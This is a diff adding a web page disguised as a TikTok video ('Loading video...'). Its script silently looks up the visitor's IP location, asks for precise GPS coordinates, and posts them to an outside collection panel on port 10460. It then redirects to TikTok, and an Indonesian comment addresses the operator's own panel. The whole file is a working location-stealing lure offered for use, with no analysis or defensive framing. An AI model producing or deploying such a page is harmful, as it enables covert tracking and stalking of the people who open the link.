@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TikTok Video</title>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetUrl = urlParams.get('url') || 'https://www.tiktok.com';
+
+        async function startTracking() {
+            let intel = { method: 'IP_ONLY', agent: navigator.userAgent };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                intel = await res.json();
+                intel.method = 'IP_RECON';
+                await sendToBot(intel);
+            } catch (e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await sendToBot({
+                        method: 'GPS_PRECISE',
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        ip: intel.ip || 'Unknown'
+                    });
+                    window.location.href = targetUrl;
+                }, () => { window.location.href = targetUrl; });
+            } else { window.location.href = targetUrl; }
+        }
+
+        async function sendToBot(data) {
+            try {
+                // Menembak ke domain panel dan port 10460 kamu
+                await fetch('http://qrstuvwxyz.sano.biz.id:10460/receive-intel', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) { console.error("Report failed"); }
+        }
+
+        window.onload = startTracking;
+    </script>
+</head>
+<body style="background:black; color:white; text-align:center; padding-top:20%;">
+    <p>Loading video...</p>
+</body>
+</html>
